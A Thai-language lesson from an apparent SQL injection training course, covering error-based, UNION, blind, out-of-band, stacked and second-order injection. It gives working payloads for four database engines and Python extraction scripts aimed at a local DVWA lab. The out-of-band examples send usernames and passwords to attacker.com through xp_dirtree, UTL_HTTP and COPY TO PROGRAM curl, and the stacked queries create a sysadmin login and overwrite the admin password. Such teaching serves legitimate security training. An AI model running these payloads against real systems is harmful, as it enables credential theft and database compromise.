# Part 007: Types of SQL Injection
## ประเภทของ SQL Injection - In-band, Blind, Out-of-band

**ระดับ:** ⭐⭐⭐ Intermediate  
**เวลาที่ใช้เรียน:** 4-5 ชั่วโมง  
**Prerequisites:** Part 001-006

---

## 🎯 วัตถุประสงค์การเรียนรู้

เมื่อเรียนจบบทนี้ ผู้เรียนจะสามารถ:
1. จำแนกประเภทของ SQL Injection ได้
2. เข้าใจลักษณะเฉพาะของแต่ละประเภท
3. เลือก Technique ที่เหมาะสมตามสถานการณ์
4. ทดสอบ In-band, Blind, และ Out-of-band SQLi
5. เปรียบเทียบข้อดีข้อเสียของแต่ละแนวทาง

---

## 1. ภาพรวมประเภท SQL Injection

```
SQL Injection
├── In-Band SQL Injection (ข้อมูลส่งกลับผ่าน Channel เดิม)
│   ├── Error-Based SQL Injection
│   └── UNION-Based SQL Injection
│
├── Inferential SQL Injection (Blind) (ไม่ได้รับข้อมูลโดยตรง)
│   ├── Boolean-Based Blind SQL Injection
│   └── Time-Based Blind SQL Injection
│
└── Out-of-Band SQL Injection (ข้อมูลส่งออกผ่าน Channel อื่น)
    ├── DNS-Based Exfiltration
    └── HTTP-Based Exfiltration
```

---

## 2. In-Band SQL Injection

### ความหมาย

**In-Band** หมายถึงผู้โจมตีสามารถรับข้อมูลผ่าน Channel เดิมที่ใช้โจมตี (HTTP Response) โดยตรง เป็นประเภทที่ง่ายและรวดเร็วที่สุด

---

## 3. Error-Based SQL Injection

### หลักการทำงาน

```
ผู้โจมตีใส่ Payload → Database เกิด Error → 
Error Message รวมข้อมูลที่ต้องการ → แสดงใน HTTP Response
```

### เมื่อไหร่ใช้ได้

```
✅ เว็บไซต์แสดง Database Error Messages โดยตรง
✅ Error Messages มี Detail ของ Query หรือข้อมูล
❌ เว็บไซต์ซ่อน Error (แสดงแค่ "Something went wrong")
```

### MySQL Error-Based Techniques

**EXTRACTVALUE Function:**
```sql
-- Syntax: EXTRACTVALUE(xml_doc, xpath_expr)
-- ถ้า xpath_expr ไม่ถูกต้อง → Error พร้อมค่าที่ประเมินได้

-- Template:
' AND EXTRACTVALUE(1,CONCAT(0x7e,[SQL_PAYLOAD]))--

-- ตัวอย่าง:
-- ดู Database Version
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
-- Error: XPATH syntax error: '~8.0.28'

-- ดู Database Name
' AND EXTRACTVALUE(1,CONCAT(0x7e,database()))--
-- Error: XPATH syntax error: '~myapp'

-- ดู Tables
' AND EXTRACTVALUE(1,CONCAT(0x7e,
    (SELECT group_concat(table_name) 
     FROM information_schema.tables 
     WHERE table_schema=database())
))--
-- Error: XPATH syntax error: '~users,products,orders'

-- ดู Columns
' AND EXTRACTVALUE(1,CONCAT(0x7e,
    (SELECT group_concat(column_name) 
     FROM information_schema.columns 
     WHERE table_name='users')
))--
-- Error: XPATH syntax error: '~id,username,password,email'

-- ดึงข้อมูล (ทีละ Row เพราะ EXTRACTVALUE รองรับ 32 chars)
' AND EXTRACTVALUE(1,CONCAT(0x7e,
    (SELECT concat(username,0x3a,password) 
     FROM users LIMIT 0,1)
))--
-- Error: XPATH syntax error: '~admin:5f4dcc3b5aa76'
```

**UPDATEXML Function:**
```sql
-- Syntax: UPDATEXML(xml_doc, xpath_expr, new_value)
-- Template:
' AND UPDATEXML(1,CONCAT(0x7e,[SQL_PAYLOAD]),1)--

-- ตัวอย่าง:
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--
-- Error: XPATH syntax error: '~8.0.28'

' AND UPDATEXML(1,CONCAT(0x7e,
    (SELECT group_concat(username,':',password) FROM users)
),1)--
```

**MySQL FLOOR/RAND Error:**
```sql
-- เก่ากว่า แต่ยังใช้ได้กับ MySQL เก่า
' AND (SELECT 1 FROM(
    SELECT COUNT(*),
    CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x 
    FROM information_schema.tables 
    GROUP BY x
)a)--
-- Error: Duplicate entry 'mydb:1' for key 'group_key'
```

**MSSQL Error-Based:**
```sql
-- CONVERT Error
' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
-- Error: Conversion failed when converting the varchar value 'users' to data type int.

-- CAST Error
'; SELECT CAST((SELECT TOP 1 username+':'+password FROM users) AS int)--
-- Error: Conversion failed when converting the varchar value 'admin:password' to data type int.

-- STR() Function
' AND 1=STR((SELECT username FROM users WHERE id=1))--
```

**Oracle Error-Based:**
```sql
-- CTXSYS.DRITHSX.SN Error
' AND 1=CTXSYS.DRITHSX.SN(user, 0)--

-- UTL_INADDR Error  
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))--

-- ORA_HASH with Bitand
' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)--
```

---

## 4. UNION-Based SQL Injection

### หลักการทำงาน

```
Original Query: SELECT col1, col2 FROM products WHERE id = [INPUT]
                                                              ↑
                                       แทรก UNION SELECT payload ที่นี่

Injected Query: SELECT col1, col2 FROM products WHERE id = -1
                UNION
                SELECT username, password FROM users
                
Result: แสดง username และ password ในตำแหน่งที่ col1, col2 ปกติแสดง
```

### Requirements ของ UNION

```
1. จำนวน Column ต้องเท่ากัน
2. Data Types ต้องเข้ากันได้
3. ต้องหา Column ที่แสดงในหน้าเว็บได้
```

### Step-by-Step UNION Attack

```sql
-- ======================================
-- STEP 1: หาจำนวน Column (ORDER BY Method)
-- ======================================
?id=1 ORDER BY 1-- → ไม่ Error
?id=1 ORDER BY 2-- → ไม่ Error
?id=1 ORDER BY 3-- → Error → มี 2 Columns!

-- STEP 1 Alternative (NULL Method)
?id=0 UNION SELECT NULL-- → Error
?id=0 UNION SELECT NULL,NULL-- → ไม่ Error → มี 2 Columns!

-- ======================================
-- STEP 2: หา Visible Column
-- ======================================
?id=0 UNION SELECT 'SQLi_Test_1','SQLi_Test_2'--
-- หน้าเว็บแสดง "SQLi_Test_1" หรือ "SQLi_Test_2"?
-- สมมติว่าแสดง "SQLi_Test_2" → Column 2 เป็น Visible

-- ======================================
-- STEP 3: ดึงข้อมูล System
-- ======================================
?id=0 UNION SELECT NULL,version()--
?id=0 UNION SELECT NULL,database()--
?id=0 UNION SELECT NULL,user()--

-- ถ้า Column 1 visible:
?id=0 UNION SELECT version(),NULL--

-- ======================================
-- STEP 4: Enumerate Tables
-- ======================================
?id=0 UNION SELECT NULL,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema=database()--

-- ======================================
-- STEP 5: Enumerate Columns
-- ======================================
?id=0 UNION SELECT NULL,group_concat(column_name)
FROM information_schema.columns
WHERE table_name='users'--

-- ======================================
-- STEP 6: Extract Data
-- ======================================
?id=0 UNION SELECT NULL,group_concat(username,':',password SEPARATOR '\n')
FROM users--
```

### UNION ข้าม Database (Cross-Database)

```sql
-- MySQL: เข้าถึง Database อื่น
?id=0 UNION SELECT NULL,group_concat(schema_name)
FROM information_schema.schemata--

-- ดึงข้อมูลจาก Database อื่น
?id=0 UNION SELECT NULL,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema='other_database'--

?id=0 UNION SELECT NULL,group_concat(username,':',password)
FROM other_database.users--
```

---

## 5. Boolean-Based Blind SQL Injection

### หลักการทำงาน

```
ไม่มี Error Message และไม่มีข้อมูลใน Response
แต่ Response ต่างกันระหว่าง True และ False

True Condition → Response A (มีข้อมูล/หน้าแสดงปกติ)
False Condition → Response B (ไม่มีข้อมูล/หน้าว่าง)

ใช้ Binary Search ทีละ Character เพื่อสร้างข้อมูล
```

### ตัวอย่างการทำงาน

```sql
-- เป้าหมาย: หาชื่อ Database ทีละตัวอักษร

-- หา Length ก่อน
?id=1 AND LENGTH(database())=1--  → False (ไม่มีข้อมูล)
?id=1 AND LENGTH(database())=2--  → False
?id=1 AND LENGTH(database())=3--  → False
?id=1 AND LENGTH(database())=4--  → True! (ชื่อ Database มี 4 ตัวอักษร)

-- หาตัวอักษรแรก
?id=1 AND ASCII(SUBSTRING(database(),1,1))>100-- → True
?id=1 AND ASCII(SUBSTRING(database(),1,1))>110-- → True
?id=1 AND ASCII(SUBSTRING(database(),1,1))>115-- → False
?id=1 AND ASCII(SUBSTRING(database(),1,1))>112-- → True
?id=1 AND ASCII(SUBSTRING(database(),1,1))>113-- → False
→ ASCII = 113, CHAR(113) = 'q' → ตัวแรกคือ 'q'!

-- ทำซ้ำสำหรับทุกตัวอักษร:
-- ตัว 2: SUBSTRING(database(),2,1) → ASCII ? → แปลงเป็น Char
-- ตัว 3: SUBSTRING(database(),3,1) → ...
-- ตัว 4: SUBSTRING(database(),4,1) → ...
-- ผล: q, u, e, r, y → "query" (ชื่อ Database)
```

### Boolean-Based Payload Templates

```sql
-- Template สำหรับ MySQL
-- [CONDITION] เป็น True หรือ False
1 AND [CONDITION]
1' AND [CONDITION]--
1') AND [CONDITION]--

-- ตัวอย่าง Conditions:
-- หา Database Name
ASCII(SUBSTRING(database(),[POS],1))>[VALUE]
ASCII(SUBSTRING(database(),[POS],1))=[VALUE]

-- หา Table Name
ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables 
WHERE table_schema=database() LIMIT 0,1),[POS],1))=[VALUE]

-- หา Column Name
ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns 
WHERE table_name='users' LIMIT 0,1),[POS],1))=[VALUE]

-- หา Data
ASCII(SUBSTRING((SELECT username FROM users LIMIT 0,1),[POS],1))=[VALUE]
```

### Binary Search Algorithm

```python
# Python Script สำหรับ Boolean-Based Blind SQLi
import requests

def extract_data_boolean(url, payload_template, max_length=50):
    """
    Extract data character by character using boolean-based blind SQLi
    
    payload_template: SQL expression ที่ต้องการ extract
    เช่น: "(SELECT database())"
    """
    result = ""
    
    for pos in range(1, max_length + 1):
        # Binary search สำหรับแต่ละ character
        low, high = 32, 126  # ASCII printable range
        
        while low <= high:
            mid = (low + high) // 2
            
            # สร้าง Payload
            condition = f"ASCII(SUBSTRING({payload_template},{pos},1))>{mid}"
            payload = f"1 AND {condition}--"
            
            # ส่ง Request
            response = requests.get(url, params={'id': payload})
            
            if "Welcome" in response.text:  # True condition
                low = mid + 1
            else:  # False condition
                high = mid - 1
        
        if low > 32:  # พบ Character
            result += chr(low)
            print(f"[+] Position {pos}: {chr(low)} → Current: {result}")
        else:
            break  # ไม่มีตัวอักษรอีกแล้ว
    
    return result

# ใช้งาน (เฉพาะใน Lab Environment!)
target_url = "http://localhost/dvwa/sqli/?Submit=Submit"
database_name = extract_data_boolean(target_url, "(SELECT database())")
print(f"[*] Database: {database_name}")
```

---

## 6. Time-Based Blind SQL Injection

### หลักการทำงาน

```
Response ไม่ต่างกันระหว่าง True/False
แต่สามารถใช้เวลาในการตอบสนองเป็นตัวบ่งชี้:

True Condition → SLEEP(n) → Response ช้าลง n วินาที
False Condition → ไม่มี Sleep → Response ปกติ
```

### Time-Based Payload Templates

**MySQL:**
```sql
-- Template:
1 AND SLEEP([SECONDS])
1' AND SLEEP([SECONDS])--

-- Conditional Sleep (ถ้าเงื่อนไขจริง → Sleep)
1 AND IF([CONDITION], SLEEP(5), 0)
1' AND IF([CONDITION], SLEEP(5), 0)--

-- ตัวอย่าง:
-- ตรวจสอบว่า Database ชื่อ 'dvwa' หรือไม่
1 AND IF(database()='dvwa', SLEEP(5), 0)--
-- Response ช้าลง 5 วินาที → ชื่อ 'dvwa' ถูกต้อง!

-- หาตัวอักษรแรกของ Database Name
1 AND IF(ASCII(SUBSTRING(database(),1,1))=100, SLEEP(5), 0)--
-- ถ้า Response ช้า 5 วินาที → ASCII 100 = 'd' ถูกต้อง

-- ดึงข้อมูลทีละตัวด้วย Sleep
1 AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1))=53, SLEEP(3), 0)--
```

**MSSQL:**
```sql
-- WAITFOR DELAY
1; WAITFOR DELAY '0:0:5'--
1'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- Conditional
1'; IF (ASCII(SUBSTRING((SELECT TOP 1 username FROM users),1,1))=97) 
    WAITFOR DELAY '0:0:5'--
```

**PostgreSQL:**
```sql
-- pg_sleep
1 AND pg_sleep(5)--
1; SELECT pg_sleep(5)--

-- Conditional
1 AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
1 AND CASE WHEN (ASCII(SUBSTRING(current_database(),1,1))=109) 
           THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

**Oracle:**
```sql
-- dbms_pipe
1 AND 1=dbms_pipe.receive_message('a',5)--

-- Conditional
1 AND CASE WHEN (1=1) 
           THEN dbms_pipe.receive_message('a',5) 
           ELSE 1 END=1--
```

### Time-Based Extraction Script

```python
import requests
import time

def extract_data_timebased(url, payload_template, sleep_time=3, threshold=2):
    """
    Extract data using time-based blind SQLi
    
    sleep_time: วินาทีที่ Sleep เมื่อเงื่อนไขจริง
    threshold: เวลา (วินาที) ที่ถือว่า True
    """
    result = ""
    pos = 1
    
    while True:
        found = False
        
        for ascii_val in range(32, 127):
            # สร้าง Time-Based Payload
            condition = f"ASCII(SUBSTRING({payload_template},{pos},1))={ascii_val}"
            payload = f"1 AND IF({condition}, SLEEP({sleep_time}), 0)--"
            
            start_time = time.time()
            
            try:
                response = requests.get(
                    url, 
                    params={'id': payload},
                    timeout=sleep_time + threshold + 1
                )
            except requests.exceptions.Timeout:
                # Timeout = Sleep เกิดขึ้น = True!
                result += chr(ascii_val)
                print(f"[+] Position {pos}: {chr(ascii_val)} → Current: {result}")
                found = True
                break
            
            elapsed = time.time() - start_time
            
            if elapsed >= threshold:
                result += chr(ascii_val)
                print(f"[+] Position {pos}: {chr(ascii_val)} → Current: {result}")
                found = True
                break
        
        if not found:
            break
        
        pos += 1
    
    return result

# ใช้งาน (เฉพาะ Lab Environment!)
target_url = "http://localhost/dvwa/sqli/?Submit=Submit"
db_name = extract_data_timebased(target_url, "(SELECT database())")
```

---

## 7. เปรียบเทียบ Boolean vs Time-Based

```
┌──────────────────────┬────────────────────┬────────────────────┐
│ คุณสมบัติ            │ Boolean-Based      │ Time-Based         │
├──────────────────────┼────────────────────┼────────────────────┤
│ ความเร็ว             │ เร็วกว่า           │ ช้ากว่า (Sleep)   │
│ Reliability          │ สูง                │ ขึ้นกับ Network    │
│ ใช้ได้เมื่อ          │ Response ต่างกัน   │ ทุกกรณี            │
│ Risk                 │ ต่ำ                │ อาจทำ Server ช้า   │
│ Detection            │ ยากกว่า            │ ง่ายกว่า (delays)  │
│ ต้องการ Response     │ ต่างกัน True/False │ ใช้ Timing         │
└──────────────────────┴────────────────────┴────────────────────┘

เมื่อไหร่ใช้ Boolean: Response แตกต่างกันเมื่อ True/False
เมื่อไหร่ใช้ Time-Based: Response เหมือนกันทุกกรณี
```

---

## 8. Out-of-Band SQL Injection

### หลักการทำงาน

```
ผู้โจมตีไม่ได้รับข้อมูลผ่าน HTTP Response
แต่ข้อมูลถูกส่งออกผ่าน DNS หรือ HTTP ไปยัง Server ของผู้โจมตี

Database → DNS Query → Attacker's DNS Server
         → HTTP Request → Attacker's HTTP Server
```

### เงื่อนไขที่ต้องการ

```
✅ Database Server มีการเชื่อมต่ออินเทอร์เน็ต
✅ Database มี Function สำหรับส่ง Network Requests
✅ Firewall ไม่ block การส่ง DNS/HTTP จาก Database
```

### MySQL Out-of-Band (Load File + UDF)

```sql
-- MySQL LOAD_FILE ไม่สามารถทำ Out-of-Band โดยตรง
-- ต้องใช้ User Defined Function (UDF) หรือ FILE privilege

-- สำหรับ Information Disclosure:
-- ใช้ DNS Exfiltration ผ่าน DNS Lookup ที่ Database ทำ
-- (ขึ้นกับ OS และ Configuration)
```

### MSSQL Out-of-Band

```sql
-- xp_dirtree สำหรับ DNS Lookup
EXEC master.dbo.xp_dirtree '\\attacker.com\share'
-- → MSSQL ทำ DNS Lookup ไปยัง attacker.com
-- → ผู้โจมตีเห็นใน DNS Log

-- ส่งข้อมูลผ่าน DNS Subdomain
'; EXEC master.dbo.xp_dirtree '\\' + 
   (SELECT TOP 1 username FROM users) + 
   '.attacker.com\share'--
-- → ถ้า username = 'admin'
-- → MSSQL ทำ DNS Lookup: admin.attacker.com
-- → ผู้โจมตีเห็น DNS Query: admin.attacker.com

-- xp_cmdshell (ถ้าเปิดอยู่)
EXEC xp_cmdshell 'nslookup ' + (SELECT TOP 1 password FROM users) + '.attacker.com'
```

### Oracle Out-of-Band

```sql
-- UTL_HTTP สำหรับ HTTP Request
-- ต้องมี EXECUTE on UTL_HTTP

SELECT UTL_HTTP.request('http://attacker.com/?data=' || 
    (SELECT user FROM dual)) FROM dual;

-- ส่งข้อมูล Database
SELECT UTL_HTTP.request('http://attacker.com/?db=' || 
    (SELECT global_name FROM global_name)) FROM dual;

-- UTL_DNS สำหรับ DNS Lookup
SELECT UTL_DNS.resolve('user=' || user || '.attacker.com') FROM dual;
-- อาจต้องใช้: 
SELECT UTL_INADDR.get_host_address(
    (SELECT username FROM users WHERE rownum=1) || '.attacker.com'
) FROM dual;
```

### PostgreSQL Out-of-Band

```sql
-- COPY TO Program
COPY (SELECT username||':'||password FROM users) 
TO PROGRAM 'curl http://attacker.com/?data=' || encode(stdin,'hex');

-- dblink (ถ้า Extension enabled)
SELECT dblink_connect('host=attacker.com user=a password=a dbname=a');

-- lo_export (Large Object)
SELECT lo_from_bytea(0, (SELECT password FROM users LIMIT 1)::bytea);
SELECT lo_export(oid, '/tmp/stolen.txt') FROM pg_largeobject_metadata;
```

### ตั้งค่า Receiver (สำหรับ Lab)

```python
# ตั้ง DNS/HTTP Server รับข้อมูล (Lab เท่านั้น)

# HTTP Server อย่างง่าย
import http.server
import socketserver

class LoggingHandler(http.server.SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        print(f"[DNS/HTTP OUT-OF-BAND] {self.address_string()} - {format % args}")
        print(f"Path: {self.path}")

PORT = 8000
with socketserver.TCPServer(("", PORT), LoggingHandler) as httpd:
    print(f"Listening on port {PORT}")
    httpd.serve_forever()
```

---

## 9. Stacked Queries (การรันหลาย Queries)

### Stacked Queries คืออะไร

```sql
-- ปกติ รัน Query เดียว:
SELECT * FROM products WHERE id = 1

-- Stacked Queries: รันหลาย Query โดยใช้ ; คั่น
SELECT * FROM products WHERE id = 1; DROP TABLE users; --

-- ใช้ได้กับ: MSSQL, PostgreSQL, MySQL (บางสถานการณ์)
```

### ตัวอย่าง Stacked Queries

**MSSQL:**
```sql
-- สร้าง Admin User
1'; EXEC sp_addlogin 'hacker', 'HackerPass123!'--
1'; EXEC sp_addsrvrolemember 'hacker', 'sysadmin'--

-- อ่านไฟล์
1'; CREATE TABLE #temp(data varchar(8000)); 
   INSERT #temp EXEC xp_cmdshell 'type C:\Windows\win.ini';
   SELECT data FROM #temp--
```

**PostgreSQL:**
```sql
-- สร้าง Table ชั่วคราว
1; CREATE TABLE IF NOT EXISTS temp_data(data text)--

-- Copy ข้อมูล
1; COPY (SELECT username||':'||password FROM users) TO '/tmp/creds.txt'--
```

**MySQL:**
```sql
-- MySQL Connector ส่วนใหญ่ไม่รองรับ Stacked Queries
-- แต่บางไดร์เวอร์รองรับ

-- ถ้ารองรับ:
1; UPDATE users SET password='hacked' WHERE username='admin'--
```

---

## 10. Second-Order SQL Injection (Stored SQLi)

### หลักการ

```
คลาสสิก SQLi: Input → Query (ทันที)
Second-Order: Input → เก็บใน DB → ดึงใช้ → Query ใหม่ (ล่าช้า)

ขั้นที่ 1: ลงทะเบียนด้วย Username: admin'--
ขั้นที่ 2: เปลี่ยน Password → ดึง username จาก DB → ใส่ใน Query
ขั้นที่ 3: Query เป็น UPDATE users SET password='...' WHERE username='admin'--'
         → แก้ password ของ admin!
```

### ตัวอย่าง Detailed

```php
<?php
// ขั้นที่ 1: Registration (ดูเหมือนปลอดภัย - มี Escaping)
$username = mysqli_real_escape_string($conn, $_POST['username']);
// username ที่ส่ง: admin'--
// หลัง escape: admin\'--
// เก็บใน DB: admin'-- (DB ลบ backslash ออก!)

// ขั้นที่ 2: Change Password Function
function changePassword($conn, $new_password) {
    // ดึง username จาก DB (ไม่ escaped อีกแล้ว!)
    $user = getCurrentUserFromDB();  // Return: admin'--
    
    // สร้าง Query โดยไม่ Escape username ที่มาจาก DB
    $query = "UPDATE users SET password='$new_password' 
              WHERE username='$user'";
    
    // Query จริง:
    // UPDATE users SET password='newpass' WHERE username='admin'--'
    // → แก้ password ของ admin!
}
?>
```

### การตรวจหา Second-Order

```
1. สมัครสมาชิกด้วย Username ที่มี SQL Characters
2. ทดสอบทุก Feature ที่ใช้ Username
3. ดูว่า Feature ไหนทำ Database Operation โดยใช้ Username
4. ทดสอบ:
   - เปลี่ยน Password
   - แก้ไข Profile
   - ลบบัญชี
   - ค้นหาด้วย Username ของตัวเอง
```

---

## 11. Blind vs Non-Blind Decision Tree

```
เมื่อพบ Injection Point → ตัดสินใจว่าจะใช้เทคนิคใด:

ทดสอบ: ' (single quote)
├── มี SQL Error Message?
│   ├── ใช่ → Error-Based SQLi!
│   │   └── ดึงข้อมูลผ่าน Error Messages
│   └── ไม่ → ทดสอบต่อ
│
├── UNION แล้ว Response เปลี่ยน?
│   ├── ใช่ → UNION-Based SQLi!
│   │   └── ดึงข้อมูลผ่าน UNION
│   └── ไม่ → ทดสอบต่อ
│
├── Boolean Test ให้ผลต่างกัน?
│   (1=1 vs 1=2)
│   ├── ต่างกัน → Boolean-Based Blind!
│   │   └── ดึงข้อมูลทีละ Character
│   └── เหมือนกัน → ทดสอบต่อ
│
├── Time Delay ทำงาน?
│   (SLEEP(5))
│   ├── ช้าลง → Time-Based Blind!
│   │   └── ดึงข้อมูลโดยใช้ Timing
│   └── ไม่ช้า → ทดสอบต่อ
│
└── DNS/HTTP เกิด?
    ├── ใช่ → Out-of-Band SQLi!
    └── ไม่ → อาจไม่มี SQLi หรือมี WAF
```

---

## 12. ตัวอย่าง Scenario จริง

### Scenario 1: Login Page (In-Band Error-Based)

```
URL: /admin/login
Payload ทดสอบ: username = admin'
Error: MySQL syntax error...

แนวทาง: Error-Based SQLi
Payload:
admin' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
→ Error: '~8.0.28'
```

### Scenario 2: Search Functionality (UNION-Based)

```
URL: /search?q=laptop
ทดสอบ: q=laptop'
ทดสอบ: q=laptop' UNION SELECT 1,2--
Response แสดง: 1 และ 2 ในผลลัพธ์

แนวทาง: UNION-Based SQLi
q=laptop' UNION SELECT 1,group_concat(username,':',password) FROM users--
→ แสดง credentials!
```

### Scenario 3: Product ID (Boolean Blind)

```
URL: /product/5
ทดสอบ: /product/5'
→ ไม่มี Error แต่ไม่แสดงสินค้า

ทดสอบ: /product/5 AND 1=1
→ แสดงสินค้า

ทดสอบ: /product/5 AND 1=2
→ ไม่แสดงสินค้า

แนวทาง: Boolean-Based Blind SQLi
/product/5 AND ASCII(SUBSTRING(database(),1,1))>100--
→ True = แสดงสินค้า, False = ไม่แสดง
→ ดึงข้อมูลทีละ Character
```

### Scenario 4: REST API (Time-Based Blind)

```
POST /api/user/search
Body: {"username": "john"}

ทดสอบ: {"username": "john' AND SLEEP(5)--"}
→ Response ช้าลง 5 วินาที!

แนวทาง: Time-Based Blind SQLi
{"username": "john' AND IF(ASCII(SUBSTRING(database(),1,1))=109, SLEEP(3), 0)--"}
→ ช้า 3 วินาที = 'm' → Database เริ่มด้วย 'm'
```

---

## 📝 แบบฝึกหัด

### Exercise 1: SQLi Classification

สำหรับแต่ละ Scenario ต่อไปนี้ ให้ระบุประเภทของ SQLi ที่เหมาะสม:

1. เว็บไซต์แสดง Error Message: "You have an error in your SQL syntax"
2. เว็บไซต์แสดงสินค้าเมื่อ `id=1` แต่ไม่แสดงเมื่อ `id=1 AND 1=2`
3. เว็บไซต์ Response ช้าลงเมื่อใส่ `id=1 AND SLEEP(5)`
4. เว็บไซต์ไม่เปลี่ยนแปลง Response แต่ DNS Log ของ Attacker ได้รับ Lookup

### Exercise 2: DVWA Boolean Blind Practice

บน DVWA หน้า SQL Injection Blind:
1. ยืนยัน Boolean-Based SQLi ด้วย True/False Test
2. หา Database Name ทีละตัวอักษร (Manual หรือ Script)
3. หา Table Names ใน Database
4. ดึงข้อมูล Username จาก users table

### Exercise 3: Time-Based Testing

บน DVWA (Security Level = Low):
1. ยืนยัน Time-Based SQLi
2. หาความยาวของ Database Name
3. หา Character แรกของ Database Name
4. บันทึก Response Times

---

## 🏆 Challenge

**Challenge 1:** เปรียบเทียบความเร็วของ Boolean-Based vs Time-Based
- เขียน Script ทั้งสองแบบ
- วัดเวลาในการดึง Database Name เต็ม
- บันทึกผลและวิเคราะห์

**Challenge 2:** Out-of-Band Lab
- ตั้งค่า Simple HTTP Server เพื่อรับ Exfiltrated Data
- ทดสอบบน DVWA หรือ SQLi-labs
- บันทึก Data ที่ได้รับ

---

## 🔑 สรุป

```
1. In-Band SQLi: ข้อมูลกลับมาใน HTTP Response เดิม
   - Error-Based: ใช้ Error Messages ที่มีข้อมูล
   - UNION-Based: ใช้ UNION เพื่อรวมผลลัพธ์

2. Blind SQLi: ไม่ได้รับข้อมูลโดยตรง
   - Boolean-Based: True/False เป็นตัวบ่งชี้
   - Time-Based: Response Time เป็นตัวบ่งชี้

3. Out-of-Band SQLi: ข้อมูลออกผ่าน DNS/HTTP
   - ต้องการ Network Access จาก DB Server
   
4. Decision Tree ช่วยเลือก Technique ที่เหมาะสม

5. เวลาในการดึงข้อมูล: UNION > Error > Boolean > Time > Out-of-Band
```

---

## ➡️ ถัดไป

**Part 008: SQL Injection Methodology**  
- กระบวนการ Penetration Testing อย่างเป็นระบบ
- Reconnaissance → Detection → Exploitation → Post-exploitation
- การเขียน Report อย่างมืออาชีพ

---

*Part 007 | SQL Injection Mastery Course | Security Education Only*
